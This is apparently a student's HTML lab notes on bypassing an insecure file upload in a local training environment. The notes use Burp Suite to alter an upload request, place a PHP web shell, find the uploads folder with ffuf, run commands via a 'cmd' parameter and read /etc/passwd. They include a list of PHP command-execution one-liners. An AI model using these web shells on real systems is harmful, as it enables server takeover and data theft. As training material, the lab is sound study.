<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Insecure File Upload - Basic Bypass</title>
</head><body>Will start the docker and web browser<br/>
<br/>
and will make a txt file and got this error:<br/>
<img height="254" src="image.png" width="750"/><br/>
<br/>
Open the dev tools for that press Q to inspect and go in the Network tab and just reload the website.<br/>
<img height="104" src="image 2.png" width="750"/><br/>
<br/>
As we can see there are no check's happening on the Client Side<br/>
An application will send a request to the web server and than come back<br/>
but in this there is no check happeing on the Client Side<br/>
<br/>
Cuz if we have check on the client side we would have simple disable the JS and the check would have never happened or simply intecept the file and change the file type.<br/>
<br/>
<br/>
Now will upload a file and turn our Burpsuite on to see what's happening this time.<br/>
<img height="365" src="image 3.png" width="800"/><br/>
<br/>
As you can see that the request has been left from the Client Side so that we can modify the request can simply remove the PNG data and put txt data there and see what happens<br/>
<br/>
<img height="251" src="image 4.png" width="750"/><br/>
<br/>
We got Error 200 <br/>
<img height="493" src="image 5.png" width="750"/><br/>
<br/>
It looks like the Check has been happening on the client side for now as we were able to upload the .txt file.<br/>
<br/>
<br/>
<br/>
Now will try to upload a php file<br/>
<img height="288" src="image 6.png" width="700"/><br/>
&lt;?php sysyem($_GET['cmd']); ?&gt;<br/>
Here GET is a super global which means this is going to get the value of the parameter that's sent in get requests.<br/>
<br/>
Another thing to take care is extensions as we want the web server to treat this as an executable file.<br/>
<br/>
<br/>
As we can see the file is stored as assest:<br/>
<img height="341" src="image 7.png" width="750"/><br/>
<br/>
<br/>
<br/>
But when we are trying to locate we got the forbidden access so will use the Fuzz to get the directory by copying the lab link<br/>
<img src="image 8.png"/><br/>
<br/>
<br/>
When we do Fuzzing using the FFuF tool we got this result<br/>
<img src="image 9.png"/><br/>
<br/>
But as we check there was nothing in assests so will fuzz labs further and got the uploads folder<br/>
<img src="image 10.png"/><br/>
<br/>
And when we hit the url <br/>
localhost/uplaods/cmd.php<br/>
<img src="image 11.png"/><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
So we need to pass a query in my cmd <br/>
?cmd=whoami<br/>
<img src="image 12.png"/><br/>
we could other php commands as well<br/>
trying all these &lt;@456226577798135808&gt; <br/>
'# Execute one command<br/>
&lt;?php system(&quot;whoami&quot;); ?&gt;<br/>
<br/>
# Take input from the url paramter. shell.php?cmd=whoami<br/>
&lt;?php system($_GET['cmd']); ?&gt;<br/>
<br/>
# The same but using passthru<br/>
&lt;?php passthru($_GET['cmd']); ?&gt;<br/>
<br/>
# For shell_exec to output the result you need to echo it<br/>
&lt;?php echo shell_exec(&quot;whoami&quot;);?&gt;<br/>
<br/>
# Exec() does not output the result without echo, and only output the last line. So not very useful!<br/>
&lt;?php echo exec(&quot;whoami&quot;);?&gt;<br/>
<br/>
# Instead to this if you can. It will return the output as an array, and then print it all.<br/>
&lt;?php exec(&quot;ls -la&quot;,$array); print_r($array); ?&gt;<br/>
<br/>
# preg_replace(). This is a cool trick<br/>
&lt;?php preg_replace('/.*/e', 'system(&quot;whoami&quot;);', ''); ?&gt;<br/>
<br/>
# Using backticks<br/>
&lt;?php $output = `whoami`; echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; ?&gt;<br/>
<br/>
# Using backticks<br/>
&lt;?php echo `whoami`; ?&gt;'<br/>
<br/>
We can also do <br/>
/etc/passwd<br/>
<img height="88" src="image 13.png" width="750"/><br/>
but if we press Ctrl + U we will formated more nicely<br/>
<br/>
<img src="image 14.png"/><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>